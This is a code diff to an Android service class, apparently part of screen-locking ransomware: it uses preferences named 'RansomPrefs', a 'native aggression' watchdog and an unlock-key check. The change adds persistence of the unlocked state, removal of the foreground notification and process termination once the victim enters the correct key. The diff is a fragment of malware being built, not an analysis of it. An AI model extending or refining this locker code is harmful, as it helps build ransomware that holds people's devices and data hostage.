@@ -179,7 +179,13 @@ public class LockerService extends Service {
         btnUnlock.setOnClickListener(v -> {
             // Menggunakan Enkripsi Militer Native Check
             if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
+                // Simpan status unlock agar tidak dikunci lagi oleh MainActivity/Boot
+                getSharedPreferences("RansomPrefs", MODE_PRIVATE).edit().putBoolean("unlocked", true).apply();
+                
                 stopNativeAggression(); // Pastikan watchdog mati duluan
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    stopForeground(STOP_FOREGROUND_REMOVE);
+                }
                 stopSelf();
                 android.os.Process.killProcess(android.os.Process.myPid()); // Force kill aplikasi
             }
